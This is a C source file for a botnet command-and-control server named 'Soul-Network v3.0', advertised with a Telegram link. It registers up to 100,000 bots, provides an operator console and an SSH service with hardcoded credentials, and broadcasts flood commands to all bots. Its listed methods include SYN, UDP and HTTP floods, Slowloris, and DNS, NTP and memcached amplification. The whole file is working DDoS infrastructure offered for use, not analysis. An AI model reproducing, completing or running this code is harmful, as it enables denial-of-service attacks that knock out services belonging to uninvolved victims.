#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>
#include <sys/stat.h>

#include "ascii_art.h"
#include "network_utils.h"
#include "ssh_service.h"

#define CNC_PORT 1930
#define MAX_BOTS 100000
#define MAX_ATTACKS 50
#define MAX_CMD_SIZE 1024

// Bot structure
typedef struct bot_s {
    char id[20];
    char ip[16];
    int port;
    time_t last_seen;
    int socket_fd;
    int active;
    pthread_t thread_id;
} bot_t;

// Attack structure
typedef struct attack_s {
    int id;
    char method[50];
    char target[256];
    int port;
    int duration;
    int threads;
    time_t start_time;
    int active;
    int bot_count;
} attack_t;

// Global variables
bot_t bots[MAX_BOTS];
attack_t attacks[MAX_ATTACKS];
int bot_count = 0;
int attack_count = 0;
int cnc_running = 1;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;

// Function prototypes
void* handle_bot_connection(void* socket_ptr);
void* attack_monitor_thread(void* arg);
void print_cnc_status();
void print_connected_bots();
void print_active_attacks();
void start_attack_command(char* command);
void stop_attack_command(int attack_id);
void stop_all_attacks();
void save_attack_log(const char* method, const char* target, int port, int duration, int threads);
void load_attack_history();
void* cnc_bot_listener(void* arg);
void command_interface();
void print_welcome_message();
void print_help();
void print_methods();

// SSH Service data access functions
bot_t* get_bots_list(void);
int get_bot_count(void);
attack_t* get_attacks_list(void);
int get_attack_count(void);
void start_real_attack(const char* method, const char* target, int port, int duration, int threads);
void stop_real_attack(int attack_id);
void stop_all_real_attacks(void);

void signal_handler(int sig) {
    (void)sig; // Mark parameter as used to avoid warning
    printf("\n\033[1;33m[*] Shutting down server...\033[0m\n");
    cnc_running = 0;
}

void print_cnc_status() {
    time_t now = time(NULL);
    char time_str[26];
    ctime_r(&now, time_str);
    time_str[24] = '\0'; // Remove newline
    
    printf("\033[1;36m");
    printf("┌────────────────────── Soul SERVER STATUS ──────────────────────┐\n");
    printf("│ Running Time:    %-40s │\n", time_str);
    printf("│ Connected Bots:  %-40d │\n", bot_count);
    printf("│ Active Attacks:  %-40d │\n", attack_count);
    printf("│ C&C Port:        %-40d │\n", CNC_PORT);
    printf("│ SSH Port:        %-40d │\n", SSH_PORT);
    printf("│ Total Attacks:   %-40d │\n", attack_count);
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

void print_connected_bots() {
    pthread_mutex_lock(&bot_mutex);
    
    printf("\033[1;35m");
    printf("┌────────────────────── CONNECTED BOTS ─────────────────────────┐\n");
    if (bot_count == 0) {
        printf("│ No bots connected                                            │\n");
    } else {
        printf("│ ID         IP Address       Port    Last Seen               │\n");
        printf("├────────────────────────────────────────────────────────────────┤\n");
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].active) {
                char time_str[20];
                strftime(time_str, sizeof(time_str), "%H:%M:%S %Y-%m-%d", 
                        localtime(&bots[i].last_seen));
                printf("│ %-10s %-15s %-6d %-20s │\n", 
                       bots[i].id, bots[i].ip, bots[i].port, time_str);
            }
        }
    }
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
    
    pthread_mutex_unlock(&bot_mutex);
}

void print_active_attacks() {
    pthread_mutex_lock(&attack_mutex);
    
    printf("\033[1;33m");
    printf("┌────────────────────── ACTIVE ATTACKS ─────────────────────────┐\n");
    if (attack_count == 0) {
        printf("│ No active attacks                                            │\n");
    } else {
        printf("│ ID  Method       Target            Port  Time   Threads     │\n");
        printf("├────────────────────────────────────────────────────────────────┤\n");
        for (int i = 0; i < attack_count; i++) {
            if (attacks[i].active) {
                int elapsed = time(NULL) - attacks[i].start_time;
                int remaining = attacks[i].duration - elapsed;
                if (remaining < 0) remaining = 0;
                
                printf("│ %-3d %-11s %-16s %-5d %-6d %-10d │\n", 
                       attacks[i].id, attacks[i].method, attacks[i].target, 
                       attacks[i].port, remaining, attacks[i].threads);
            }
        }
    }
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
    
    pthread_mutex_unlock(&attack_mutex);
}

void add_bot(int socket_fd, struct sockaddr_in client_addr) {
    pthread_mutex_lock(&bot_mutex);
    
    if (bot_count < MAX_BOTS) {
        // Find inactive slot or create new
        int slot = -1;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].active) {
                slot = i;
                break;
            }
        }
        if (slot == -1) {
            slot = bot_count;
            bot_count++;
        }
        
        // Initialize bot
        bots[slot].socket_fd = socket_fd;
        strcpy(bots[slot].ip, inet_ntoa(client_addr.sin_addr));
        bots[slot].port = ntohs(client_addr.sin_port);
        bots[slot].last_seen = time(NULL);
        bots[slot].active = 1;
        snprintf(bots[slot].id, sizeof(bots[slot].id), "BOT-%03d", slot + 1);
        
        printf("\033[1;32m[+] Bot connected: %s from %s:%d\033[0m\n", 
               bots[slot].id, bots[slot].ip, bots[slot].port);
    } else {
        printf("\033[1;31m[!] Maximum bot capacity reached\033[0m\n");
        close(socket_fd);
    }
    
    pthread_mutex_unlock(&bot_mutex);
}

void remove_bot(int socket_fd) {
    pthread_mutex_lock(&bot_mutex);
    
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].socket_fd == socket_fd && bots[i].active) {
            printf("\033[1;31m[-] Bot disconnected: %s from %s:%d\033[0m\n", 
                   bots[i].id, bots[i].ip, bots[i].port);
            bots[i].active = 0;
            close(socket_fd);
            break;
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
}

void send_to_bot(int bot_index, const char* message) {
    if (bot_index >= 0 && bot_index < bot_count && bots[bot_index].active) {
        send(bots[bot_index].socket_fd, message, strlen(message), 0);
    }
}

void broadcast_to_bots(const char* message) {
    pthread_mutex_lock(&bot_mutex);
    
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].active) {
            send(bots[i].socket_fd, message, strlen(message), 0);
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
}

void start_attack_command(char* command) {
    char method[50], target[256];
    int port, duration, threads;
    
    if (sscanf(command, "attack %49s %255s %d %d %d", 
               method, target, &port, &duration, &threads) == 5) {
        
        pthread_mutex_lock(&attack_mutex);
        
        if (attack_count < MAX_ATTACKS) {
            attacks[attack_count].id = attack_count + 1;
            strcpy(attacks[attack_count].method, method);
            strcpy(attacks[attack_count].target, target);
            attacks[attack_count].port = port;
            attacks[attack_count].duration = duration;
            attacks[attack_count].threads = threads;
            attacks[attack_count].start_time = time(NULL);
            attacks[attack_count].active = 1;
            attacks[attack_count].bot_count = bot_count;
            
            // Build attack command for bots
            char attack_cmd[MAX_CMD_SIZE];
            snprintf(attack_cmd, sizeof(attack_cmd), "ATTACK %s %s %d %d %d", 
                    method, target, port, duration, threads);
            
            // Send to all bots
            broadcast_to_bots(attack_cmd);
            
            // Log the attack
            save_attack_log(method, target, port, duration, threads);
            
            printf("\033[1;32m[+] Attack #%d started: %s on %s:%d for %d seconds with %d threads\033[0m\n",
                   attacks[attack_count].id, method, target, port, duration, threads);
            
            attack_count++;
        } else {
            printf("\033[1;31m[!] Maximum attack capacity reached\033[0m\n");
        }
        
        pthread_mutex_unlock(&attack_mutex);
    } else {
        printf("\033[1;31m[!] Invalid attack command format\033[0m\n");
        printf("Usage: attack <method> <target> <port> <time> <threads>\n");
    }
}

void stop_attack_command(int attack_id) {
    pthread_mutex_lock(&attack_mutex);
    
    int found = 0;
    for (int i = 0; i < attack_count; i++) {
        if (attacks[i].id == attack_id && attacks[i].active) {
            attacks[i].active = 0;
            broadcast_to_bots("STOP");
            printf("\033[1;33m[+] Stopped attack #%d\033[0m\n", attack_id);
            found = 1;
            break;
        }
    }
    
    if (!found) {
        printf("\033[1;31m[!] Attack #%d not found or already stopped\033[0m\n", attack_id);
    }
    
    pthread_mutex_unlock(&attack_mutex);
}

void stop_all_attacks() {
    pthread_mutex_lock(&attack_mutex);
    
    for (int i = 0; i < attack_count; i++) {
        if (attacks[i].active) {
            attacks[i].active = 0;
        }
    }
    
    broadcast_to_bots("STOP_ALL");
    printf("\033[1;33m[+] All attacks stopped\033[0m\n");
    
    pthread_mutex_unlock(&attack_mutex);
}

void save_attack_log(const char* method, const char* target, int port, int duration, int threads) {
    FILE* log_file = fopen("attack_log.txt", "a");
    if (log_file) {
        time_t now = time(NULL);
        char time_str[26];
        ctime_r(&now, time_str);
        time_str[24] = '\0'; // Remove newline
        
        fprintf(log_file, "[%s] %s %s:%d %ds %d threads\n", 
                time_str, method, target, port, duration, threads);
        fclose(log_file);
    }
}

void load_attack_history() {
    FILE* log_file = fopen("attack_log.txt", "r");
    if (log_file) {
        printf("\033[1;36m[*] Loading attack history...\033[0m\n");
        fclose(log_file);
    }
}

void* attack_monitor_thread(void* arg) {
    (void)arg; // Mark parameter as used
    while (cnc_running) {
        pthread_mutex_lock(&attack_mutex);
        
        time_t current_time = time(NULL);
        for (int i = 0; i < attack_count; i++) {
            if (attacks[i].active) {
                int elapsed = current_time - attacks[i].start_time;
                if (elapsed >= attacks[i].duration) {
                    printf("\033[1;32m[+] Attack #%d completed automatically\033[0m\n", attacks[i].id);
                    attacks[i].active = 0;
                }
            }
        }
        
        pthread_mutex_unlock(&attack_mutex);
        sleep(1);
    }
    return NULL;
}

void* handle_bot_connection(void* socket_ptr) {
    int socket_fd = *(int*)socket_ptr;
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    getpeername(socket_fd, (struct sockaddr*)&client_addr, &addr_len);
    add_bot(socket_fd, client_addr);
    
    char buffer[MAX_CMD_SIZE];
    while (cnc_running) {
        int bytes_received = recv(socket_fd, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            break;
        }
        
        buffer[bytes_received] = '\0';
        
        // Update bot last seen time
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].socket_fd == socket_fd && bots[i].active) {
                bots[i].last_seen = time(NULL);
                break;
            }
        }
        pthread_mutex_unlock(&bot_mutex);
        
        // Process bot messages
        if (strstr(buffer, "STATUS:")) {
            printf("Bot status: %s\n", buffer);
        }
    }
    
    remove_bot(socket_fd);
    free(socket_ptr);
    return NULL;
}

void* cnc_bot_listener(void* arg) {
    (void)arg; // Mark parameter as used
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;
    
    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket creation failed");
        return NULL;
    }
    
    // Set socket options
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("Setsockopt failed");
        close(server_fd);
        return NULL;
    }
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(CNC_PORT);
    
    // Bind socket
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        close(server_fd);
        return NULL;
    }
    
    // Listen for connections
    if (listen(server_fd, 10) < 0) {
        perror("Listen failed");
        close(server_fd);
        return NULL;
    }
    
    printf("\033[1;32m[+] Soul Bot listener started on port %d\033[0m\n", CNC_PORT);
    
    while (cnc_running) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        int client_socket = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
        if (client_socket < 0) {
            if (cnc_running) {
                perror("Accept failed");
            }
            continue;
        }
        
        // Handle each bot connection in a separate thread
        pthread_t bot_thread;
        int* new_sock = malloc(sizeof(int));
        *new_sock = client_socket;
        
        pthread_create(&bot_thread, NULL, handle_bot_connection, new_sock);
        pthread_detach(bot_thread);
    }
    
    close(server_fd);
    return NULL;
}

// Wrapper function for SSH service thread
void* ssh_service_wrapper(void* arg) {
    (void)arg;
    start_ssh_service();
    return NULL;
}

void start_ssh_in_thread() {
    pthread_t ssh_thread;
    pthread_create(&ssh_thread, NULL, ssh_service_wrapper, NULL);
    printf("\033[1;32m[+] SSH service starting on port %d...\033[0m\n", SSH_PORT);
}

void print_welcome_message() {
    printf("\033[1;35m");
    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║                          Soul-Network v3.0                     ║\n");
    printf("║                     join my telegram: https://t.me/yonqv168    ║\n");
    printf("║                         Soul-Network (Raw Power🔥)             ║\n");
    printf("║                                                                ║\n");
    printf("║                         Server Initialized                     ║\n");
    printf("║                        Ready for connections...                ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    printf("\033[0m");
}

void print_help() {
    printf("\033[1;36m");
    printf("┌────────────────────── CNC COMMANDS ───────────────────────────┐\n");
    printf("│ help                    - Show this help message              │\n");
    printf("│ status                  - Show server status                  │\n");
    printf("│ bots                    - List connected bots                 │\n");
    printf("│ attacks                 - Show active attacks                 │\n");
    printf("│ attack <method> <target> <port> <time> <threads>              │\n");
    printf("│                         - Start an attack                     │\n");
    printf("│ stop <id>               - Stop specific attack                │\n");
    printf("│ stop all                - Stop all attacks                    │\n");
    printf("│ methods                 - Show available methods              │\n");
    printf("│ clear                   - Clear screen                        │\n");
    printf("│ exit                    - Shutdown server                     │\n");
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

void print_methods() {
    printf("\033[1;33m");
    printf("┌───────────────────── ATTACK METHODS ──────────────────────────┐\n");
    printf("│ UDP-FLOOD        - UDP flood using connected sockets          │\n");
    printf("│ UDP-RAW          - UDP flood using raw sockets                │\n");
    printf("│ TCP-SYN          - TCP SYN flood                              │\n");
    printf("│ TCP-ACK          - TCP ACK flood                              │\n");
    printf("│ HTTP-FLOOD       - HTTP/HTTPS request flood                   │\n");
    printf("│ SLOWLORIS        - Slowloris attack                           │\n");
    printf("│ ICMP-FLOOD       - ICMP ping flood                            │\n");
    printf("│ DNS-AMP          - DNS amplification attack                   │\n");
    printf("│ NTP-AMP          - NTP amplification attack                   │\n");
    printf("│ MEMCACHED-AMP    - Memcached amplification attack             │\n");
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

void command_interface() {
    char command[MAX_CMD_SIZE];
    
    while (cnc_running) {
        printf("\033[1;35mC&C>\033[0m ");
        fflush(stdout);
        
        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;
        }
        
        // Remove newline
        command[strcspn(command, "\n")] = 0;
        
        if (strcmp(command, "help") == 0) {
            print_help();
        }
        else if (strcmp(command, "status") == 0) {
            print_cnc_status();
        }
        else if (strcmp(command, "bots") == 0) {
            print_connected_bots();
        }
        else if (strcmp(command, "attacks") == 0) {
            print_active_attacks();
        }
        else if (strncmp(command, "attack ", 7) == 0) {
            start_attack_command(command);
        }
        else if (strncmp(command, "stop ", 5) == 0) {
            int attack_id;
            if (sscanf(command, "stop %d", &attack_id) == 1) {
                stop_attack_command(attack_id);
            } else {
                printf("\033[1;31m[!] Usage: stop <attack_id>\033[0m\n");
            }
        }
        else if (strcmp(command, "stop all") == 0) {
            stop_all_attacks();
        }
        else if (strcmp(command, "methods") == 0) {
            print_methods();
        }
        else if (strcmp(command, "clear") == 0) {
            printf("\033[2J\033[1;1H");
            print_welcome_message();
        }
        else if (strcmp(command, "exit") == 0) {
            printf("\033[1;33m[*] Shutting down CNC server...\033[0m\n");
            cnc_running = 0;
            break;
        }
        else if (strlen(command) > 0) {
            printf("\033[1;31m[!] Unknown command: %s\033[0m\n", command);
            printf("Type 'help' for available commands.\n");
        }
    }
}

// SSH Service data access functions
bot_t* get_bots_list(void) {
    return bots;
}

int get_bot_count(void) {
    return bot_count;
}

attack_t* get_attacks_list(void) {
    return attacks;
}

int get_attack_count(void) {
    return attack_count;
}

void start_real_attack(const char* method, const char* target, int port, int duration, int threads) {
    char command[1024];
    snprintf(command, sizeof(command), "attack %s %s %d %d %d", method, target, port, duration, threads);
    start_attack_command(command);
}

void stop_real_attack(int attack_id) {
    stop_attack_command(attack_id);
}

void stop_all_real_attacks(void) {
    stop_all_attacks();
}

int main() {
    // Set signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Show banner and initialize
    print_banner();
    printf("\033[1;33m[*] Initializing CNC Server...\033[0m\n");
    print_loading(3);
    
    // Load attack history
    load_attack_history();
    
    // Start SSH service
    start_ssh_in_thread();
    
    // Start attack monitor thread
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, attack_monitor_thread, NULL);
    pthread_detach(monitor_thread);
    
    // Start bot listener in separate thread
    pthread_t listener_thread;
    pthread_create(&listener_thread, NULL, cnc_bot_listener, NULL);
    
    // Wait a moment for services to start
    sleep(2);
    
    // Show welcome message
    print_welcome_message();
    print_cnc_status();
    
    printf("\033[1;35m[+] CNC Server fully operational!\033[0m\n");
    printf("\033[1;36m[+] Bot connections on port: %d\033[0m\n", CNC_PORT);
    printf("\033[1;36m[+] SSH access on port: %d\033[0m\n", SSH_PORT);
    printf("\033[1;33m[+] SSH Credentials: admin/admin123 \033[0m\n");
    printf("\033[1;32m[+] Connect with: ssh  admin@<ur ip>\033[0m\n", SSH_PORT);
    printf("\033[1;32m[+] Or use Putty to connect to port %d\033[0m\n\n", SSH_PORT);
    
    // Start command interface
    command_interface();
    
    // Cleanup
    printf("\033[1;33m[*] Cleaning up...\033[0m\n");
    
    // Stop all attacks
    stop_all_attacks();
    
    // Close all bot connections
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].active) {
            close(bots[i].socket_fd);
            bots[i].active = 0;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    
    printf("\033[1;32m[+] C&C Server shutdown complete\033[0m\n");
    return 0;
}
